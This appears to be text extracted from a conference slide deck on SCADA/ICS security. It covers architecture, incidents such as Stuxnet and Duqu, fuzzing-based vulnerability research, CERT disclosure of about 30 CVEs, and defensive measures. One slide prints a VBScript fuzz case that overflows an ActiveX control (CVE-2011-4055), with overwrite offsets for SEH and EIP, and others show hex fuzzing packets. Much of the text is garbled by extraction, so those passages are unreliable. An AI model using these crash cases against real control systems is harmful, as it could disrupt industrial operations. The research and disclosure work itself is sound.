SCADA 
      101629


SCADA SCADA SCADA  
1

SCADA
2

SCADA

SCADA-

(Supervisory Control and Data

Acquisition)

- (Industrial Control System ICS)

-   SCADA





-  (Human Machine Interface, HMI)

- 

-  (Remote Terminal Unit, RTU)

-  (Programmable Logic Controller, PLC)

-  (Communication infrastructure)

3

SCADA

SCADA()  ( PLC)   
-   
-  
-  
-  

:http://en.wikipedia.org/wiki/SCADA

4



LLeevveell44 BBuussssiinneessssPPlalannnniinngg

LLeevveel l 33

MMaannuuffaaccttuurriinngg OOppeerraattioionnss MMaannaaggeemmeenntt

EERRPP,,AAPPOO,,LLooggisistticicss SSyysstteemmss
MMEESS,,LLIIMMSS,,WWMMSS,, CCMMMMSSyysstteemmss

LLeevveell22 SSuuppeerrvvisisoorryyCCoonnttrrooll

HHMMII,,SSCCAADDAA,,BBaattcchh SSyysstteemmss

LLeevveel l 11

PPlalannttCCoonnttrrooll

PPLLCC((PPrrooggrraammLLooggicic CCoonnttrrool)l),,DDCCSS((DDisisttrriibbuutteedd CCoonnttoorrllSSyysstteemm))

LLeevveell00 PPhhyyssicicaallEEqquuiippmmeenntt II//OO,,DDeevviciceess,,SSeennssoorrss
5

SCADA
 
6

SCADA
7

422.0000077  ...     DIE HA...RD

2004~2005 ·2S00C7 A­ "DHaAckersTake Down the Most Wired

Country in Europe" for a period of two



weeks. ­ Wired Magazine

·2007 ­ "Solar Sunrise" ­ Three teenagers
2006 ­ "SCADA Secpuenreittrayte&USTAeirrrFoorrcise mlog:isWtices'ysrteemNs oatt

Crying Wolf" presenv·t2aa0rti0oi7ous­nM3tCiododmtleh'sEesaeBsctulsrauiptcypkdoirvHt ibsaaiostenFs, Teidppeirnagl

2006 Conference byPIoSinSt, dXem-Foonsrtrcaetes how a SCADA system
flaw can be exploited to cause a system crash

·2008 ­ "Hackersliterallyturn ou...t the lights in multiple cities after breaking into electrical

utilities and demanding extortion payments." ­ Associated Press

·2008 ­ "SCADA vulnerability discovered...control software package used by as many as

one-third of the world's industrial plants." ­ SC Magazine

·2008 ­ "SCADA Buffer overflow flaw revealed" ­ "Security Hole Exposes Utilities to

Internet Attack" ­ Sassociated Press ·20072011 ­ Blackhat SCADA!!!

8

SCADA-
   
9

SCADA-

 MicrosoftLinux OSServerPC IP EthernetWireless 

 

SCADA Server Database

Modem

Internet

Satellite

Web Server

Modem Wireless

RTU

RTU

Modem RTU RTU
10

SCADA


-  - SCADA

-  -  - 

-  - IP - 


-  - Web -  ()

-  
- 

- 

11

Stuxnet
2010 ­ Stuxnet 
- USB - SCADA
·2010  ICS-CERT ·  ·10 2011  ·10001500
12

Duqu Worm

2011 ­ Duqu Worm

- DuquWord 



-

France,

France,

StuxnetNethNeerltahnedrsl,aSnwdistz,Sewrlaitnzde,rUlaknradi,ne

-

Ukraine
SymantecPaul IWranoodDuqu

IranIInnddiiaa

SudSaundan

VViieettnnaamm

13

 
 !
14

SCADA(1/3)
March 2011,  34   
- Siemens Tecnomatix FactoryLink
- Iconics, Genesis32 and Genesis64
- DATAC RealWin - 7-Technologies IGSS -...
15

SCADA(2/3)
·2012/1 ·GERockwellSchneiderKoyo
SEL56() ·8 ()
16

SCADA(3/3)
ICS-CERT (Industrial Control Systems Computer Emergency Response Team )
- ICS-CERT2010/5~2012/3147SCADA 
- http://www.us-cert.gov/control_systems/ics-cert/
Digital Bond
- ()46 - 129 - http://www.digitalbond.com/
17

SCADA(1/2)
 http://chajack.myweb.hinet.net/genesis32.htm
18

SCADA(2/2)
 http://www.kingview.com/fangan
/detail.aspx?contentid=483 &Page1=3
19

SCADA



NT4.0?

SCADA

SC ADA??

!
... SCADAOA ...

SC ADA? Patch

 

......?  ?

......

20

SCADA
21

SCADA
 (VA)
- Nessus

-  -  (PT)
 (Fuzzing)
-  (Local) -  (Remote)
22


(Fuzzing)
- Fuzz testing -  - 
 - 

23



 ( )  
 
  

 





N

Y 


24

(Fuzzer)

(Fuzzer)-

- Mutation-Based fuzzer (Dumb) - Generation-Based fuzzer (Smart)

  

Append string

Fuzzing!!!

DUMB and
DUMBE RRRRR

25

SCADA (1/2)

- ICS-CERT, http://www.us-cert.gov/control_systems/ics-cert/ - Digital Bond, http://www.digitalbond.com/scadapedia/vulnerability-
notes/ - Secunia, http://secunia.com/advisories/ - CVE Details, http://www.cvedetails.com/vendor.php

- Web ServerWeb Service - FTPSMTPPOP3 - Browser - File Format

-  - ActiveX
26

SCADA (2/2)

- Local or Remote - 

- http://www.exploit-db.com - http://aluigi.altervista.org

- http://www.google.com
27

SCADA

N

SCADA

 

CERT

 

Y 







 





CVE
28

SCADA
SCADA download filetype:iso
SCADA  
29


File format Network
- Wireshark - Google
Modbus DNP (Distributed Network Protocol) EtherNET/IP PROFIBUS
ActiveX
- OleView
30



Local
-  - /COM/ActiveX
Remote
- Web/Service - FTPSMTPDNS

Fuzzer
Browser
·Comraider (ActiveX) ·cross_fuzz
Web Server
·WebFuzz ·SNFuzzer
Network Services
·Sulley (Fuzzing Framework) ·Peach Fuzzzer ·SNFuzzer
File Format
·FileFuzz

31

SCADA








 


32


Debugger
- Ollydbg - Windbg - Immunity Debugger
Disassembler
- IDA Pro
Others
- Metasploit
33

 (Proof of Concept, POC)
3
-  -  - Shellcode
34


  CERT   CVE
35

·SCADA
Google
·
  
·
  
·
 
·
   Exploit code

·
 CWE 
·
 
·CERT
 PGP
·

·

·CVE


 (CVE-2011-4055)
37

SCADA (CVE-20114055)
<object classid='clsid:67BE6D83-1E12-11D0-B9D3-0020AFE4BC61' id='target' /></target> <script language='vbscript'> 'File Generated by COMRaider v0.0.167 - http://labs.idefense.com 'Wscript.echo typename(target) 'for debugging/custom prolog targetFile = "C:\PROGRA~1\TECNOM~1\FACTOR~1\Client\WEBCLI~1\Bin\WEBCLI~ 1.OCX" prototype = "Invoke_Unknown LocationURL As String" memberName = "LocationURL" progid = "WebClientLib.WebClient" argCount = 1 arg1=String(10440, "A") target.LocationURL = arg1 </script>
38

 (CVE-2011-4055)

ICST

Length > 323 will overwrite SEH Length > 191 will overwrite EIP Length > 187 will overwrite EBP
39

POC (CVE-2011-4055)
40

 (GE Intelligent Platforms)

43 00 01 00 00 00 0c 00 00 00 14 00 00 00 00 03 00 00 00 01

43 00 01 00 00 00 0c 00 00 00 36 00 00 00 00 03 00 00 00 01 00 00 00 00

00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 07 00 44 00 45 00 46 00 41

00 55 00 4c 00 54

Data

43 00 01 00 00 00 0c 00 00 00 cf 00 00 00 00 05 00 00 00 01 00 00 00 06 00 54 00 45 00 53 00 54 00 30 00 31 00 00 00 51 00 43 00 3a 00 5c 00 50 00 72 00 6f 00 67 00 72 00 61 00 6d 00 20 00 46 00 69 00 6c 00 65 00 73 00 5c 00 47 00 45 00 20 00 46 00 61 00 6e 00 75 00 63 00 5c 00 50 00 72 00 6f 00 66 00 69 00 63 00 79 00 20 00 50 00 6f 00 72 00 74 00 61 00 6c 00 5c 00
77 00 65 00 62 00 61 00 70 00 70D00at7a3 00 5c 00 69 00 6e 00 66 00 6f 00
41 00 67 00 65 00 6e 00 74 00 53 00 72 00 76 00 5c 00 57 00 45 00 42 00 2d 00 49 00 4e 00 46 00 5c 00 6c 00 6f 00 67 00 73 00 5c 00 54 00 45 00 53 00 54 00 30 00 31 00 00 04 01 03

41

SCADA (GE Intelligent Platforms)

43 00 01 00 00 00 0c 00 00 00 cf 00 00 00 00 05 00 00 00 01 00 00 00 06 00

54 00 45 00 53 00 54 00 30 00 31 00 00 00 51 00 43 00 3a 00 5c 00 50 00

72 00 6f 00 67 00 72 00 61 00 6d 00 20 00 46 00 69 00 6c 00 65 00 73 00 5c

00 47 00 45 00 20 00 46 00 61 00 6e 00 75 00 63 00 5c 00 50 00 72 00 6f

00 66 00 69 00 63 00 79 00 20 00 50 00 6f 00 72 00 74 00 61 00 6c 00 5c 00

77 00 65 00 62 00 61 00 70 00 70 00 73 00 5c 00 69 00 6e 00 66 00 6f 00

41 00 67 00 65 00 6e 00 74 00 53 00 72 00 76 00 5c 00 57 00 45 00 42 00

2d 00 49 00 4e 00 46 00 5c 00 6c 00 6f 00 67 00 73 00 5c 00 54 00 45 00 53

00 54 00 30 00 31 00 00 04 01 03

Data

(Unicode)

Fuzzing

42

 (GE Intelligent Platforms)
43

POC (GE Intelligent Platforms)
44


45


SIEMENS Invensys EMERSON GE Intelligent Platforms Schneider Electric Citect (Schneider Electric) 7-Technologies (Schneider Electric) ARC Informatique Beijer Electronics Mitsubishi Electric Advantech ADLINK ...
46


2011/531 67 50SCADA (exploitable)
- 2346
69% 74%
47

Overview of Results
 (30%)  (18%)
- Software crash - Resource consumption
48

(1/2)

   



Buffer Overflow

18

/ 





SQL Injection 2   

File Manipulation

6 



 /

DLL Hijacking

7   

CRLF

1   

49

(2/2)

   



Directory Traversal
DoS

2    9  ~ 

XSS

4  ~ 

Memory Leak 1  ~ 
50

 (CVE-2011-4870)
51

 (CVE-2011-4043)
101
52

 (CVE-2011-4534)
53

 (GE Intelligent Platforms)
54

SQL Injection(CVE-2011-4521)
55

 (CVE-2011-4525) (1/2)
56 56

(2/2)

57

SCADA...
 ·2010, Pon...emon8
·2011, "ICS "201110200  ·2011, Night Dragon  SCADA  ·2011, Nitro 25   ·2011,SCADA   ·2012, ICS-CERTSCADA ·20125,  Flame  
58


59



ICST
Start


CERT/CC JPCERT/CC ICS-CERT
 


 Yes 
No

Yes  
No

  Vendor

Yes  
No

 

 
End

End

60





 (Triple-DES or AES-128) E-MailPGP



 

( ):
 ·7~10
·30~60
·



 

 

 


61


       (POC)   
62


CERT35
- ICS-CERT25 - JPCERT/CC9 - CERT/CC1
CERT20
- ICS-CERT15 - US-CERT1  - JPCERT4
30CVE Identifier number
- CVE-2011-1914CVE-2011-3330CVE-2011-3996CVE-2011-4033 CVE-2011-4034CVE-2011-4035CVE-2011-4036CVE-2011-4043 CVE-2011-4053CVE-2011-4055CVE-2011-4056CVE-2011-4057 CVE-2011-4521CVE-2011-4522CVE-2011-4523CVE-2011-4524 CVE-2011-4525CVE-2011-4526CVE-2011-4533CVE-2011-4534 CVE-2011-4870CVE-2012-0223CVE-2012-0224CVE-2012-0309 CVE-2012-0310CVE-2012-1814CVE-2012-1815CVE-2012-1816 CVE-2012-1817CVE-2012-1818
63

 (1/2)
ICS-CERT2011/8~2012/3Monthly Monitor ICST
64

(2/2)
Schneider Electric ICST (Schneider Electric )
- http://www.scada.schneiderelectric.com/sites/scada/en/login/historian-vulnerability.page
Invensys ICST
- http://iom.invensys.com/EN/pdfLibrary/Security_Bulletin_LFSEC 000000067.pdf
SIEMENS ICST
- http://www.siemens.com/corporatetechnology/pool/de/forschungsfelder/Siemens_Security_Advisory_ SSA-850510.pdf
65

  ICS-CERT
ICS-CERT Advisory 15 
- http://www.us-cert.gov/control_systems/pdf/ICSA-12-047-01.pdf - http://www.us-cert.gov/control_systems/pdf/ICSA-11-279-01.pdf - http://www.us-cert.gov/control_systems/pdf/ICSA-11-279-02.pdf - http://www.us-cert.gov/control_systems/pdf/ICSA-11-277-01.pdf - http://www.us-cert.gov/control_systems/pdf/ICSA-11-353-01.pdf - http://www.us-cert.gov/control_systems/pdf/ICSA-12-025-01.pdf - http://www.us-cert.gov/control_systems/pdf/ICSA-12-025-02A.pdf - http://www.us-cert.gov/control_systems/pdf/ICSA-12-047-01.pdf - http://www.us-cert.gov/control_systems/pdf/ICSA-11-307-01.pdf - http://www.us-cert.gov/control_systems/pdf/ICSA-11-332-01.pdf - http://www.us-cert.gov/control_systems/pdf/ICSA-11-340-01.pdf - http://www.us-cert.gov/control_systems/pdf/ICSA-12-013-01.pdf - http://www.us-cert.gov/control_systems/pdf/ICSA-12-016-01.pdf - http://www.us-cert.gov/control_systems/pdf/ICSA-11-343-01.pdf - http://www.us-cert.gov/control_systems/pdf/ICSA-12-138-01.pdf
66

  US-CERTJPCERT
US-CERT Advisory 1 
- "Wibu-Systems CodeMeter remote denial of service vulnerability"
http://www.kb.cert.org/vuls/id/659515
JPCERT Advisory 4 
- "CSWorks LiveData Service vulnerable to denial-of-service (DoS)"
http://jvn.jp/en/jp/J VN98649286/index.html - Wibu-Systems CodeMeter Runtime vulnerable to denial-of-service
http://jvn.jp/en/jp/JVN78901873/index.html
- Cogent DataHub vulnerable to cross-site scripting
http://jvn.jp/en/jp/JVN12983784/index.html
- Cogent DataHub vulnerable to HTTP header injection
http://jvn.jp/en/jp/JVN63249231/index.html
67

68

69

70

71

72

73

SCADA


- USB

-  - VPN

-  - FirewallIDS

-  - Log
 

            
74



-  -  - 
-   
75


Control Systems Security Program (CSSP) Standards & References
- http://www.us-cert.gov/control_systems/csstandards.html
21 Steps to Improve Cyber Security of SCADA Networks
- http://www.oe.netl.doe.gov/docs/prepare/21stepsbooklet.pdf
Common Cybersecurity Vulnerabilities in Industrial Control Systems
- http://www.uscert.gov/control_systems/pdf/DHS_Common_Cybersecurity_Vulnerabiliti es_ICS_2010.pdf
Vulnerability Analysis of Energy Delivery Control Systems
- http://energy.gov/sites/prod/files/Vulnerability Analysis of Energy Delivery Control Systems 2011.pdf
76

 

